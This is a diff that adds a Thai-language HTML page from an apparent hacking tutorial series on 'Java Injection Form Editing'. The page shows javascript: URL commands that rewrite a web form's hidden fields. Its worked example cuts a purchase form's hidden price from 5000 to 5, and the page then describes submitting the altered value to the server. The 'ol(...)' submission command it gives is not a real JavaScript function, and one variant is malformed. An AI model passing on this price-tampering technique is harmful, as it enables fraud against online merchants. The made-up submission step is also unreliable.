@@ -1,0 +1,76 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Java Injection Form Editing information</title>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
+<link href="smf.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+<!--
+.style0 {
+	                   font-family: "MS Sans Serif";
+					   font-size: 14px;
+					   color:#006699;
+					   scrollbar-face-color: #0099FF;
+					   scrollbar-highlight-color: #006699; 
+					   scrollbar-shadow-color: #006699; 
+					   scrollbar-arrow-color: #FFFFFF;
+					   scrollbar-track-color: #FFFFFF; 
+					   scrollbar-darkshadow-color: #009900;
+        }
+		a:link {
+	color: #F58227;
+	text-decoration: none;
+}
+a:visited {
+	text-decoration: none;
+	color: #006699;
+}
+a:hover {
+	text-decoration: none;
+	background-color: #FF8204;
+	color: #FFFFFF; 
+	
+}
+-->
+</style>
+</head>
+<body  class="style0">
+<font color="#FF0000">III. Java Injection Form Editing </font><br>
+<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ทำได้โดย ใช้คำสั่ง<br><br>
+<font color="#FF0000">javascript:void(document.forms[x].field.value=&quot;you 
+  want&quot;);alert(document.forms[x].field.value)</font><br><br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;forms[x] ค่า x คือลำดับของ form 
+ที่จะ Edit โดยเริ่มจากศูนย์ ส่วน Field นั้นเป็นชื่อ Field ที่ต้องการ Edit ส่วนคำสั่ง 
+alert นั้นเพื่อดูว่าค่า Hidden Field ที่เราเปลี่ยนไปนั้นได้ผลหรือไม่ 
+<p>&lt;<font color="#FF0000">form</font> name=&quot;form2&quot; method=&quot;post&quot; 
+  action=&quot;<font color="#FF0000">เป้าหมายที่ต้องการ</font>&quot;&gt;<br>
+  <br>
+  &lt;input name=&quot;price&quot; type=&quot;hidden&quot; id=&quot;price<font color="#FF0000"><u>&quot; 
+  value=&quot;5000</u></font>&quot;&gt;<br>
+  &lt;span class=&quot;style2&quot;&gt;ซื้อจำนวน&lt;/span&gt;<br>
+  &lt;input name=&quot;textfield&quot; type=&quot;text&quot; size=&quot;16&quot; 
+  maxlength=&quot;16&quot; &gt;<br>
+  &lt;span class=&quot;style2&quot;&gt;ตัว&lt;/span&gt;<br>
+  &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Submit&quot;&gt;<br>
+  <br>
+  &lt;/form&gt;</p>
+<p><font color="#FF0000">javascript:void(document.forms[0].price.<u>value=&quot;5&quot;</u>);alert(document.forms[0].price.value)</font></p>
+<p>จากตัวอย่างเป็นการเปลี่ยน hidden field ที่มีชื่อว่า price ให้มีค่าเป็น 5 โดยเป็น 
+  form แรก forms[x] จึงมีค่าเป็น 0 แต่ในขั้นแรกนี้เป็นการเปลี่ยนค่าภายในเครื่องของเราเท่านั้นเอง 
+  ซึ่งจะไม่มีประโยชน์หากเราไม่ส่งไป Run บน Server ซึ่งขั้นต่อไป คือการส่งค่าที่เปลี่ยนไปทำงานบน 
+  Server โดยใช้คำสั่งต่อไปนี้<br>
+  <font color="#FF0000">javascript:void(document.forms[x].field.value=&quot;ค่าใหม่&quot;);ol(document.forms[x].field.value=&quot;ค่าใหม่&quot;)</font><br>
+  หรือ<br>
+  <font color="#FF0000">javascript:void(document.forms[x]. field.value=&quot; 
+  ค่าใหม&quot;);ol('document.forms[x]. field.value=&quot;ค่าใหม&quot; webserver.php')</font><br>
+  คำสั่งแรกนั้นได้อธิบายไว้แล้วในตอนแรก ส่วนคำสั่ง ol นั้นเป็นคำสั่งที่ใช้ส่งค่าที่เปลี่ยนไปทำงานบน 
+  Server <br>
+</p>
+<br><br>
+<a href="jinfo2.html">&nbsp;&nbsp;&nbsp;&nbsp;</a><a href="jinfo1.html">&nbsp;I. 
+Injection Basic</a><br>
+<a href="jinfo3.html">&nbsp;&nbsp;&nbsp;&nbsp;</a><a href="jinfo2.html">II.Cookie 
+Editing </a> 
+</body>
+</html>
